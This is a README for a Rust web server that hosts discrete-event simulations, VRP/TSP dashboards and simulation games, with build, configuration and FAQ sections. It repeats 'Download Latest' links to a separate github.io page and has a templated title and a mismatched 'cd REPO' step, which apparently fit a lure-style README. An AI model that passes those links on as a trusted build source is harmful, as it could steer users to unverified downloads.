# DES Web MASH Server vLatest - Discrete-Event Simulation Web Server 2026

> **DES Web MASH Server is a Rust web stack that hosts interactive discrete-event simulations, research-style games, and live routing or learning dashboards directly in the browser.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20web%20server-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylerb1968/des-mash-sim-web?style=flat-square)](https://github.com/tylerb1968/des-mash-sim-web)

---

<p align="center">
  <a href="https://tylerb1968.github.io/des-mash-sim-web/">
    <img src="https://img.shields.io/badge/Download-DES%20Web%20MASH%20Server%20Latest-brightgreen?style=for-the-badge" alt="Download DES Web MASH Server">
  </a>
</p>

> **[Direct Download - DES Web MASH Server Latest](https://tylerb1968.github.io/des-mash-sim-web/)**

---

[Download Latest Build](https://tylerb1968.github.io/des-mash-sim-web/)

---

## What this project is

DES Web MASH Server packages discrete-event simulation content and simulation games as browser pages served from a Rust application. The material covers operations-research style topics, including vehicle routing, traveling-salesperson runs, warehouse motion, elevator control, and tournament scheduling.

The audience is learners, researchers, and practitioners who prefer visual interfaces and live dashboards over batch-only tooling. Under the hood you get Axum, HTMX, SeaORM, PostgreSQL, and Supabase, with compressed HTML and JavaScript bundles so each experience can ship as compact web content.

---

## Capabilities

- Host interactive DES pages and game UIs in the browser.
- Keep an index of simulations and games ready to open.
- Ship soccer tournament flows and learning-run sessions.
- Include a hands-on soccer rotation planner.
- Expose live VRP and TSP routing dashboards.
- Animate warehouse-floor motion via Track3t.
- Deliver elevator dispatch lessons with playback controls.
- Rely on HTMX for fragment updates and refreshed views.
- Optional Supabase magic-link sign-in.
- Talk to PostgreSQL with SeaORM.
- Apply declarative PostgreSQL schema changes through `dpm`.
- Stay online with a thinner feature set if the database, auth layer, or upstream services drop out.

---

## Installation

### Clone the repository

```bash
git clone https://github.com/tylerb1968/des-mash-sim-web.git
cd REPO
```

### Build and start the server

```bash
cargo build --release
cargo run --release
```

Once the process is up, visit the local URL printed by the app.

For a packaged rollout, run the binary under `target/release` and supply whatever database or authentication settings your deployment needs before you start it.

---

## Usage

A common path looks like this:

1. Launch the Rust server on your machine or target host.
2. Open the simulation catalog in a browser.
3. Pick a simulation, game, or learning page.
4. Set inputs and start a run.
5. Watch live updates, routing boards, animation, or playback output.
6. Dive into the soccer planner, VRP/TSP dashboards, warehouse scene, or elevator dispatch pages when you want a focused view.

Selected fragments are refreshed through HTMX, so many actions avoid a full page reload.

---

## Configuration

What you configure depends on which database, auth, and upstream pieces you enable. Export the matching environment values before you start the process.

Example configuration pattern:

```env
DATABASE_URL=postgresql://user:password@localhost:5432/des_web
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_ANON_KEY=your-anon-key
```

Drive PostgreSQL schema updates with `dpm` when the model changes. Keep secrets out of the repo and check the project’s config files for the exact variable names this build expects.

---

## Requirements

- Rust toolchain including Cargo.
- A browser that handles modern HTML and JavaScript.
- PostgreSQL if you turn on persistent data features.
- Supabase setup when magic-link authentication is desired.
- Network reachability for any upstream services you enable.
- Disk space for the repo, release binaries, and compressed HTML/JS assets.

Optional pieces can be missing; the server then runs with a reduced surface rather than failing hard.

---

## FAQ

### Who should use DES Web MASH Server?

Anyone investigating discrete-event simulation, simulation games, or operations-research demos—especially VRP and TSP style scenarios.

### How do I move to a newer build?

Fetch the latest tree, rebuild the Rust binary, and restart whatever runs the service.

```bash
git pull
cargo build --release
```

### Where do database settings live?

Connection strings and related options come from the server environment. SeaORM opens PostgreSQL; schema work can go through `dpm`.

### Do I have to use Supabase?

Magic-link auth goes through Supabase. Pages that do not need sign-in can still work when that integration is unset.

### A page will not open—what first?

Verify the server process is running, the browser URL is correct, and required PostgreSQL, Supabase, or upstream settings are in place. Check process logs for connection or config failures.

### Why are some functions thinner than others?

The design prefers graceful degradation. Anything that needs the database, auth, or an upstream service may offer less until those dependencies return.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
